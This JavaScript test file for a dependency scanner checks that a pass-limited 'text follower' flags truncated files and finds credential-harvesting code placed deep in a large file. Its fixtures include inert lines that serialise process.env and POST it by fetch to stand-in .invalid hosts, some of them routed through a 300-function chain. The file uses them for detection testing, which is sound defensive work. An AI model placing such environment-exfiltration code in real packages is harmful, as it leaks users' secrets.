// BIG-BUNDLE-TAIL (0.1.9): the text follower, which answers where the supply-chain tree cannot (a text the parser
// refuses), reads a text whole, and a limit it meets before the text's end makes the file SC-TRUNCATED in the limit's
// words; the review's tail (REVIEW-FP-GITHUB-SCRIPT.md), an assignment past the follower's first 5,000, is found. Twin
// of python/tests/registry/test_big_bundle_tail_limits.py and of the engine's flow_tail_tests.rs. Inert text only:
// nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { call, importTimeRisk, NativeExhausted, exhaustedWhy } from "../src/lib/native.js";
import { depFileIssues } from "../src/deps.js";

const CLI = join(dirname(fileURLToPath(import.meta.url)), "..", "bin", "lazaret.js");
const HARVEST = "reads credentials or the whole environment and sends data over the network";

// (big-bundle-tail.test.js's bundle)
const module = (k, code = null) => `/***/ ${k}:\n/***/ ((module, exports, __nccwpck_require__) => {\n\n"use strict";\n${
  code ?? `function normalize${k}(options) {\n  options = options || {};\n  const result = { retries: options.retries || 3, name: "m${k}" };\n  return result;\n}\n`
  + `class Client${k} {\n  constructor(base) { this.base = base; this.options = normalize${k}({ retries: ${k % 7} }); }\n`
  + `  path(p) { return this.base + "/" + p.split("/").filter((s) => s.length > 0).map((s) => encodeURIComponent(s)).join("/"); }\n}\n`
  + `const cache${k} = new Map();\nfunction lookup${k}(key) { if (cache${k}.has(key)) return cache${k}.get(key); const v = key + ${k}; cache${k}.set(key, v); return v; }\n`
  + `module.exports = { Client${k}, lookup${k}, normalize${k} };\n`}\n/***/ }),\n\n`;

/** A bundle past 2,000,000 characters: benign modules, `code` among them at `at` (0: its start, 1: its end), `main`
 * after the module table, `helper` in its core module (9001), the first. */
function bundle({ code = null, at = 0, main = "", helper = "" } = {}) {
  const mods = [];
  let n = 0;
  while (n < 2_100_000) { mods.push(module(10_000 + mods.length)); n += mods[mods.length - 1].length; }
  if (code !== null) mods.splice(Math.min(Math.floor(mods.length * at), mods.length), 0, module(99, code));
  mods.unshift(module(9001, 'exports.info = function info(m) { return m.length; };\n' + helper));
  return "var __webpack_modules__ = ({\n\n" + mods.join("") + "});\nvar __webpack_module_cache__ = {};\n"
    + "function __nccwpck_require__(id) { var c = __webpack_module_cache__[id]; if (c !== undefined) return c.exports;"
    + " var m = __webpack_module_cache__[id] = { exports: {} }; __webpack_modules__[id](m, m.exports, __nccwpck_require__);"
    + " return m.exports; }\n(() => {\nconst core = __nccwpck_require__(9001);\nasync function run() {\n" + main
    + "  core.info(\"done\");\n}\nrun();\n})();\n";
}

/** A --deps scan (the CLI's) of a project whose one dependency, `x`, has `index.js`: its report's issues. */
function depsScan(index) {
  const root = mkdtempSync(join(tmpdir(), "lz-bbt-"));
  const out = mkdtempSync(join(tmpdir(), "lz-bbt-out-"));
  try {
    const files = { "package.json": '{"name": "app", "version": "1.0.0"}\n', "index.js": "module.exports = 1;\n",
      "node_modules/x/package.json": '{"name": "x", "version": "1.0.0"}\n', "node_modules/x/index.js": index };
    for (const [rel, text] of Object.entries(files)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, text, "utf8");
    }
    spawnSync(process.execPath, [CLI, root, "--out-dir", out, "-q", "--deps"], { encoding: "utf8" });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8")).issues;
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
}

const PASSES = "the text follower reads at most 256 passes over the names, and this text's still had more to give";

test("a limit the text follower meets makes the file SC-TRUNCATED in its words", () => {
  // a chain of 300 functions each giving its parameter to the one before it in the text, in code the parser refuses
  let chain = "function g299(v) { fetch('https://c.invalid/x', { method: 'POST', body: v }); }\n";
  for (let k = 298; k >= 0; k--) chain += `function g${k}(v) { g${k + 1}(v); }\n`;
  const content = "const payload=JSON.stringify(process.env);\nfetch('https://c.invalid/x',{method:'POST',body:payload});\n"
    + chain + "g0(JSON.stringify(process.env));\nfunction refused( {\n";
  // asked without `unread`, the engine's call answers as one that ran out, in the limit's words
  assert.throws(() => call("dep_file_issues", { lang: "js", redact: false, neumaier: false }, content),
    (e) => e instanceof NativeExhausted && e.message === PASSES && exhaustedWhy(e) === PASSES);
  // asked with it (the dependency check's), what it found, and the file SC-TRUNCATED beside it
  const [found, , cutIssue] = depFileIssues("node_modules/x/index.js", content, "js");
  assert.deepEqual([found.rule, found.sev, cutIssue.rule, cutIssue.sev], ["SC-IMPORT-RISK", "CRITICAL", "SC-TRUNCATED", "CRITICAL"]);
  assert.ok(cutIssue.msg.includes(PASSES), cutIssue.msg);
  // and a --deps scan makes the dependency's file SC-TRUNCATED, saying so
  const issues = depsScan(content);
  const cut = issues.filter((i) => i.rule === "SC-TRUNCATED" && i.file.replaceAll("\\", "/").endsWith("x/index.js"));
  assert.equal(cut.length, 1, JSON.stringify(issues.map((i) => [i.rule, i.file])));
  assert.equal(cut[0].sev, "CRITICAL");
  assert.ok(cut[0].msg.includes(PASSES), cut[0].msg);
  // a big benign dependency: nothing unread
  assert.deepEqual(depsScan(bundle()).filter((i) => i.rule === "SC-TRUNCATED" || i.rule === "SC-IMPORT-RISK"), []);
});

test("the review's tail: an assignment past the follower's first 5,000, in a text past the tree's old limit", () => {
  const pad = "\n" + "void 0;\n".repeat(250001);
  for (const n of [4999, 5000]) {
    const text = Array.from({ length: n }, (_, k) => `const z${k}=0;\n`).join("")
      + "const payload=JSON.stringify(process.env);\nfetch('https://review.invalid/collect',{method:'POST',body:payload});\n";
    assert.deepEqual(importTimeRisk(text + pad, "js"), [[HARVEST], n + 2], `${n}`);
  }
});
